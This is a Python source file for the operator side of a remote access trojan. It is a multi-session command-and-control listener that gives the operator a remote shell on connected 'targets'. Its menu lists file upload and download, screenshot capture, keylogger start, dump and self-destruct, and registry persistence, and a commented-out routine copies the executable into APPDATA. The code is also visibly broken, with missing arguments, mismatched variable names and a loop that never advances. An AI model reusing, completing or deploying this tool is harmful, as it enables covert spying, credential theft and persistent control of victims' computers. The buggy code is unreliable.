import os
import socket
import subprocess
from  termcolor import *
import json
import threading



def reliable_recv(target):
    
    data = ''
    while True: 
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)

        except ValueError:

            continue

def reliable_send(target,data):

    jsondata = json.dumps()
    target.send(jsondata)

def upload_file(file_name):
    f = open(file_name,'rb')
    target.send(f.read())


def download_file(target,file_name):
    f = open(file_name,'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


''' def persist(x1,y1):

    file_location = os.environ['appdata'] + '\\' + y1

    try:

        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call()

    except:

        pass '''


def target_communication(target,ip):
    count = 0

    #message = target.recv(1024)
    #print(message.decode())
    while True:

        command = input('* Shell~%s: '% str(ip))
        #target.send()
        reliable_send(command)
        if command == 'quit':
            break

        elif command == 'clear':
            os.system('clear')

        elif command[:3] == 'cd ':
            pass  
        # elif command == 'cd': FOR WIN10
            # pass

        elif command[:6] == 'upload':
            upload_file(command[7:])
            #upload image.jpg

        elif command[:8] == 'download':
            download_file(command[9:])


        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count),'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)

                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1


        # elif command[:11] == 'persistence':
        #     reg_name, copy_name = command[:12].split(' ')
        #     persist(reg_name,copy_name)

        elif command == 'help':

            print(colored('''\n
            quit                                --> Quit The Session with The Target
            clear                               --> Cler the Screen
            cd *Directory Name*                 --> Changes Directory on Target System
            upload *File Name*                  --> Upload File to The Target Machine
            download *File Name*                --> Download File from Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That the target Inputted
            keylof_stop                         --> Stop and Self Destruct Keylogger File
            persistence *Regname* *File Name*   --> Create Persistence In Registry
            whoami                              --> Showing User Name
            setxkbmap *Country Code*            --> Chanching Language
            netstat -nr                         --> Kernel Ip Routing Table 
            pwd                                 --> Current Working Directory'''),'green')

        else:

            result = reliable_recv
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sck.accept()
            targets.append(target)
            ips.append(ip)
            print(colored('[+] Target Connected From: '+str(ip),'green'))
            #target_communication()
        except:
            pass

# sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# sck.bind(('127.0.0.1',5555))

# print(colored('[+] Listening For The Incoming Connections','green'))

# sck.listen(5)

# target, ip = sck.accept()
# print(colored('[+] Target Connected From: '+str(ip),'green'))
# target_communication()

targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.126.2.2',5555))
sock.listen(5)
t1 = threading.Thread(target = accept_connections())
t1.start()
print(colored('[+] Waiting for the incoming connections ','green'))

while True: 

    command = input('Command Control Center')
    if command == 'targets':

        counter = 0
        for ip in ips:

            print('Session '+str(counter)+'   '+str(ip))
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:

            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
        except:
            print('No session under the ıd number')
    elif command == 'exit':
        for target in targets:
            reliable_send(target,'quit')
            target.close()
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips(int(command[5:]))
        reliable_send(targ,'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':

        x = len(targets)
        print(x)
        i = 0
        try:
            while i<x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber,command)
        except:
            print('Failed')
    else:
        print(colored('[+] Command Doesn"t exist ','red'))